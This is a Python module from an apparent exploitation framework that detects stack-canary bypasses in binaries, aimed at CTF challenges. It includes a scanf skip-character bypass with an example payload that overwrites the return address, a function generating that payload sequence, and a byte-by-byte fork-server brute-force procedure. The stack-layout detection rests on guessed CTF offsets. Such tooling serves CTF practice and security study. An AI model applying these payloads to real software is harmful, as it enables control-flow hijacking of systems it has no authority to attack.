"""
Canary Bypass Detection Module.

Detects various techniques to bypass stack canaries:
- scanf format specifier bypass (entering '.' or '/' to skip writes)
- Format string canary leak
- Thread-local storage attacks
- Partial overwrite techniques
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import TYPE_CHECKING, Dict, List, Optional, Tuple, Any

if TYPE_CHECKING:
    from supwngo.core.binary import Binary

from supwngo.vulns.detector import (
    VulnerabilityDetector, Vulnerability, VulnType, VulnSeverity, ExploitPrimitive
)
from supwngo.fuzzing.crash_triage import CrashCase
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class CanaryBypassType(Enum):
    """Types of canary bypass techniques."""
    SCANF_SKIP = auto()          # scanf with %lf/%d can be skipped with invalid input
    FORMAT_STRING_LEAK = auto()  # Leak canary via format string
    BRUTE_FORCE = auto()         # Byte-by-byte brute force (fork server)
    THREAD_LOCAL = auto()        # TLS canary overwrite
    PARTIAL_OVERWRITE = auto()   # Partial overwrite avoiding canary


@dataclass
class ScanfBypassInfo:
    """Information about a scanf-based canary bypass opportunity."""
    scanf_addr: int                    # Address of scanf call
    format_string: str                 # Format specifier used (%d, %lf, etc)
    buffer_offset: int                 # Offset from buffer start to canary
    canary_index: int                  # Array index that corresponds to canary
    skip_char: str                     # Character to use for skipping ('.' or '/')
    controllable_after: List[int] = field(default_factory=list)  # Indices after canary


# scanf format specifiers that can be "skipped" with invalid input
SKIPPABLE_SCANF_FORMATS = {
    '%d': ['.', '/', '+', '-'],      # Integer - skip with non-numeric
    '%i': ['.', '/', '+', '-'],      # Integer (any base)
    '%u': ['.', '/', '+', '-'],      # Unsigned integer
    '%ld': ['.', '/', '+', '-'],     # Long integer
    '%lu': ['.', '/', '+', '-'],     # Unsigned long
    '%lld': ['.', '/', '+', '-'],    # Long long
    '%llu': ['.', '/', '+', '-'],    # Unsigned long long
    '%f': ['/', 'x', 'X'],           # Float - skip with invalid float
    '%lf': ['.', '/', 'x'],          # Double - '.' alone is invalid, doesn't write
    '%Lf': ['.', '/', 'x'],          # Long double
    '%hd': ['.', '/', '+', '-'],     # Short
    '%hhd': ['.', '/', '+', '-'],    # Char as number
}

# Size of each format specifier in bytes
SCANF_FORMAT_SIZES = {
    '%d': 4, '%i': 4, '%u': 4,
    '%ld': 8, '%lu': 8,
    '%lld': 8, '%llu': 8,
    '%f': 4, '%lf': 8, '%Lf': 16,
    '%hd': 2, '%hhd': 1,
    '%c': 1, '%s': -1,  # Variable
}


class CanaryBypassDetector(VulnerabilityDetector):
    """
    Detects canary bypass opportunities.

    Focuses on scanf-based bypasses where invalid input skips the write,
    allowing an attacker to overflow past the canary without corrupting it.
    """

    name = "canary_bypass_detector"
    vuln_type = VulnType.STACK_BUFFER_OVERFLOW  # Canary bypass enables BOF exploitation

    def __init__(self, binary: "Binary"):
        super().__init__(binary)
        self.bypass_opportunities: List[ScanfBypassInfo] = []

    def detect(
        self,
        crash: Optional[CrashCase] = None,
    ) -> List[Vulnerability]:
        """
        Detect canary bypass opportunities.

        Args:
            crash: Optional crash case (not used for static detection)

        Returns:
            List of detected vulnerabilities with bypass information
        """
        vulns = []

        # Only relevant if canary is enabled
        if not self.binary.protections.canary:
            logger.debug("No canary protection, bypass detection not needed")
            return vulns

        # Check for scanf-based bypass
        scanf_bypass = self._detect_scanf_bypass()
        if scanf_bypass:
            vulns.extend(scanf_bypass)

        # Check for format string canary leak
        fmtstr_leak = self._detect_format_string_leak()
        if fmtstr_leak:
            vulns.extend(fmtstr_leak)

        # Check for fork-based brute force opportunity
        brute_force = self._detect_brute_force_opportunity()
        if brute_force:
            vulns.extend(brute_force)

        self._vulnerabilities = vulns
        return vulns

    def get_exploit_primitive(
        self,
        vuln: Vulnerability,
    ) -> Optional[ExploitPrimitive]:
        """
        Get exploitation primitive for canary bypass vulnerability.

        Args:
            vuln: Detected vulnerability

        Returns:
            ExploitPrimitive for stack write after canary bypass
        """
        if not vuln.details:
            return None

        bypass_type = vuln.details.get('bypass_type')
        if bypass_type == CanaryBypassType.SCANF_SKIP.name:
            # Scanf skip provides a write primitive to stack after canary
            return ExploitPrimitive(
                primitive_type="write",
                target_controllable=False,  # Fixed stack location
                value_controllable=True,    # We control the value
                size_controllable=False,    # Fixed by format specifier
                write_size=8,  # 64-bit return address
            )
        elif bypass_type == CanaryBypassType.BRUTE_FORCE.name:
            # Brute force eventually gives us the canary
            return ExploitPrimitive(
                primitive_type="leak",
                read_size=8,  # Canary is 8 bytes
            )

        return None

    def _detect_scanf_bypass(self) -> List[Vulnerability]:
        """
        Detect scanf-based canary bypass opportunities.

        When scanf reads with format specifiers like %d or %lf in a loop,
        entering invalid input (like '.' for %lf) causes scanf to NOT write
        to the destination, effectively "skipping" that position.

        This allows overwriting return address without touching the canary.
        """
        vulns = []

        # Check if scanf is used
        scanf_funcs = ['scanf', '__isoc99_scanf', '__isoc23_scanf', 'fscanf', 'sscanf']
        has_scanf = any(func in self.binary.plt for func in scanf_funcs)

        if not has_scanf:
            return vulns

        # Look for scanf format strings in binary
        scanf_formats = self._find_scanf_formats()

        for fmt_addr, fmt_str in scanf_formats:
            # Check if this format is skippable
            for specifier, skip_chars in SKIPPABLE_SCANF_FORMATS.items():
                if specifier in fmt_str:
                    # Found a potentially exploitable scanf
                    bypass_info = self._analyze_scanf_context(
                        fmt_addr, fmt_str, specifier, skip_chars[0]
                    )

                    if bypass_info:
                        vuln = Vulnerability(
                            vuln_type=VulnType.STACK_BUFFER_OVERFLOW,
                            severity=VulnSeverity.HIGH,
                            address=fmt_addr,
                            detection_method="static",
                            description=f"scanf canary bypass via {specifier} skip",
                            details={
                                "bypass_type": CanaryBypassType.SCANF_SKIP.name,
                                "format_specifier": specifier,
                                "skip_character": skip_chars[0],
                                "canary_index": bypass_info.canary_index,
                                "buffer_offset": bypass_info.buffer_offset,
                                "exploitation": self._generate_bypass_hint(bypass_info),
                            }
                        )
                        vulns.append(vuln)
                        self.bypass_opportunities.append(bypass_info)

        return vulns

    def _find_scanf_formats(self) -> List[Tuple[int, str]]:
        """Find scanf format strings in binary."""
        formats = []

        # Common scanf format patterns
        patterns = [b'%d', b'%lf', b'%ld', b'%f', b'%u', b'%i']

        try:
            data = self.binary.path.read_bytes()

            for pattern in patterns:
                idx = 0
                while True:
                    idx = data.find(pattern, idx)
                    if idx == -1:
                        break

                    # Extract surrounding context (format string)
                    start = max(0, idx - 10)
                    end = min(len(data), idx + 20)
                    context = data[start:end]

                    # Find null terminators
                    null_before = context.rfind(b'\x00', 0, idx - start)
                    null_after = context.find(b'\x00', idx - start)

                    if null_before != -1:
                        fmt_start = null_before + 1
                    else:
                        fmt_start = 0

                    if null_after != -1:
                        fmt_end = null_after
                    else:
                        fmt_end = len(context)

                    fmt_str = context[fmt_start:fmt_end].decode('latin-1', errors='ignore')

                    # Calculate virtual address
                    file_offset = start + fmt_start
                    vaddr = self._file_offset_to_vaddr(file_offset)

                    if vaddr and fmt_str:
                        formats.append((vaddr, fmt_str))

                    idx += len(pattern)

        except Exception as e:
            logger.debug(f"Error finding scanf formats: {e}")

        return formats

    def _file_offset_to_vaddr(self, offset: int) -> Optional[int]:
        """Convert file offset to virtual address."""
        try:
            if hasattr(self.binary, '_elf') and self.binary._elf:
                for seg in self.binary._elf.segments:
                    if seg.header.p_type != 'PT_LOAD':
                        continue
                    seg_offset = seg.header.p_offset
                    seg_size = seg.header.p_filesz
                    if seg_offset <= offset < seg_offset + seg_size:
                        return seg.header.p_vaddr + (offset - seg_offset)
        except Exception:
            pass
        return None

    def _analyze_scanf_context(
        self,
        fmt_addr: int,
        fmt_str: str,
        specifier: str,
        skip_char: str
    ) -> Optional[ScanfBypassInfo]:
        """
        Analyze the context around a scanf call to determine exploitability.

        Tries to determine:
        - Buffer size and location
        - Canary position relative to buffer
        - Which array index corresponds to canary
        """
        # Get size of data type
        elem_size = SCANF_FORMAT_SIZES.get(specifier, 4)

        # Common stack layouts for CTF challenges:
        # - Small buffers: 32-64 elements
        # - Canary typically at end of buffer area

        # Heuristic: estimate based on common patterns
        # Most CTF challenges use 32-element arrays of doubles (256 bytes)
        # Canary is typically right after the buffer

        # For x86_64: buffer at rbp-0x110, canary at rbp-0x8
        # Distance: 0x110 - 0x8 = 0x108 = 264 bytes
        # For 8-byte elements: 264 / 8 = 33 elements (index 33 is canary)

        common_layouts = [
            # (buffer_offset_from_canary, element_size, canary_index)
            (264, 8, 33),   # 33 doubles, common CTF pattern
            (256, 8, 32),   # 32 doubles
            (128, 4, 32),   # 32 ints
            (64, 4, 16),    # 16 ints
            (256, 4, 64),   # 64 ints
        ]

        # Try to match based on element size
        for buf_offset, elem_sz, canary_idx in common_layouts:
            if elem_sz == elem_size:
                return ScanfBypassInfo(
                    scanf_addr=fmt_addr,
                    format_string=specifier,
                    buffer_offset=buf_offset,
                    canary_index=canary_idx,
                    skip_char=skip_char,
                    controllable_after=[canary_idx + 1, canary_idx + 2]  # RBP, RIP
                )

        # Default estimate
        canary_idx = 33 if elem_size == 8 else 64
        return ScanfBypassInfo(
            scanf_addr=fmt_addr,
            format_string=specifier,
            buffer_offset=canary_idx * elem_size,
            canary_index=canary_idx,
            skip_char=skip_char,
            controllable_after=[canary_idx + 1, canary_idx + 2]
        )

    def _generate_bypass_hint(self, info: ScanfBypassInfo) -> str:
        """Generate exploitation hint for scanf bypass."""
        return f"""scanf Canary Bypass Technique:

1. The program uses scanf with '{info.format_string}' format in a loop
2. Entering '{info.skip_char}' causes scanf to NOT write to the destination
3. The canary is at array index {info.canary_index}

Exploitation:
- Fill buffer indices 0 to {info.canary_index - 1} with controlled values
- Send '{info.skip_char}' for index {info.canary_index} to SKIP the canary
- Continue overwriting indices {info.controllable_after} (RBP, RIP)

Example payload sequence:
```python
# Fill buffer
for i in range({info.canary_index}):
    io.sendline(b"1.0")  # or any valid value

# Skip canary
io.sendline(b"{info.skip_char}")

# Overwrite RBP (can be junk)
io.sendline(hxd(0x4141414141414141))

# Overwrite RIP (return address)
io.sendline(hxd(target_address))
```

Helper function to convert address to double:
```python
def hxd(val):
    import struct
    return str(struct.unpack('d', struct.pack('<Q', val))[0])
```
"""

    def _detect_format_string_leak(self) -> List[Vulnerability]:
        """Detect format string vulnerabilities that could leak canary."""
        vulns = []

        # Check for printf
        if 'printf' not in self.binary.plt:
            return vulns

        # Look for potential format string vulns
        # This is a simplified check - full detection is in format_string.py
        dangerous_patterns = [
            b'printf(buf',
            b'printf(input',
            b'printf(str',
        ]

        # For now, just note that format string could be used for leak
        # Full detection should cross-reference with format_string detector

        return vulns

    def _detect_brute_force_opportunity(self) -> List[Vulnerability]:
        """Detect if brute force canary bypass is possible (fork server)."""
        vulns = []

        # Check for fork
        if 'fork' not in self.binary.plt:
            return vulns

        # Fork-based servers allow canary brute force
        # Each connection gets same canary (child process)
        vuln = Vulnerability(
            vuln_type=VulnType.STACK_BUFFER_OVERFLOW,
            severity=VulnSeverity.MEDIUM,
            address=self.binary.plt.get('fork', 0),
            detection_method="static",
            description="Fork server allows canary brute force (byte-by-byte)",
            details={
                "bypass_type": CanaryBypassType.BRUTE_FORCE.name,
                "exploitation": """
Fork Server Canary Brute Force:

The binary uses fork() for handling connections.
Child processes inherit the parent's canary value.
This allows byte-by-byte brute forcing:

1. Overflow one byte past buffer into canary
2. If child crashes, wrong byte
3. If child continues, correct byte
4. Repeat for all 7 bytes (first byte is always 0x00)

Maximum attempts: 7 * 256 = 1792 (practical: ~900 average)
""",
            }
        )
        vulns.append(vuln)

        return vulns


def detect_canary_bypass(binary: "Binary") -> List[Vulnerability]:
    """
    Convenience function to detect canary bypass opportunities.

    Args:
        binary: Target binary

    Returns:
        List of canary bypass vulnerabilities
    """
    detector = CanaryBypassDetector(binary)
    return detector.detect()


def get_scanf_skip_payload(
    num_elements: int,
    canary_index: int,
    target_address: int,
    elem_format: str = "%lf",
    skip_char: str = "."
) -> List[bytes]:
    """
    Generate payload sequence for scanf canary bypass.

    Args:
        num_elements: Total number of elements to send
        canary_index: Index where canary is located
        target_address: Address to write as return address
        elem_format: scanf format specifier
        skip_char: Character to skip canary

    Returns:
        List of payloads to send (one per scanf iteration)
    """
    import struct

    def addr_to_double(addr: int) -> str:
        """Convert address to double representation for scanf %lf."""
        packed = struct.pack('<Q', addr)
        double_val = struct.unpack('d', packed)[0]
        return str(double_val)

    payloads = []

    for i in range(num_elements):
        if i < canary_index:
            # Fill buffer with arbitrary values
            payloads.append(b"1.0")
        elif i == canary_index:
            # Skip canary
            payloads.append(skip_char.encode())
        elif i == canary_index + 1:
            # RBP - can be junk
            payloads.append(addr_to_double(0x4141414141414141).encode())
        elif i == canary_index + 2:
            # RIP - target address
            payloads.append(addr_to_double(target_address).encode())
        else:
            # Extra padding if needed
            payloads.append(b"0.0")

    return payloads
